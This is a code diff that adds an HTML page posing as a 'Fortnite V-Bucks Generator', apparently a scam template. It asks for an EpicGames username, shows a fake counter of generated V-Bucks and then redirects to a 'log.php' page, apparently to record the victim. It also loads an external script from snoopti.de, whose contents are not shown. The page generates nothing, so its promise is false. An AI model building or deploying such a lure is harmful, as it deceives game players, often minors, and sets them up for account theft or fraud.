@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <!-- You can delete this script, header and footer to use your own style -->
+    <script src="https://snoopti.de/cloud/code/github.js"></script>
+  </head>
+  <body>
+    <header></header>
+    <main>
+      <h1>Fortnite V-Bucks Generator</h1>
+      <input type="text" placeholder="EpicGames Username" />
+      <select id="Amount">
+        <option value="1000">1.000</option>
+        <option value="5000">5.000</option>
+        <option value="10000">10.000</option>
+        <option value="30000">30.000</option>
+      </select>
+      <button onclick="startCountdown()">GENERATE</button>
+      <p id="countdown"></p>
+      <script>
+        function startCountdown() {
+          var selectedOption = document.getElementById("Amount");
+          var countdownValue = parseInt(selectedOption.value);
+          var countdown = 0;
+
+          var countdownInterval = setInterval(function () {
+            if (countdown <= countdownValue) {
+              document.getElementById("countdown").innerHTML =
+                countdown + " V-Bucks generated..."; // Countdown message
+              countdown += 352; // Interval at which Vbucks are generated
+            } else {
+              clearInterval(countdownInterval);
+              window.location.href = "./log.php";
+            }
+          }, 200); // Interval time in ms
+        }
+      </script>
+    </main>
+    <footer></footer>
+  </body>
+  <!-- by snoopti -->
+</html>
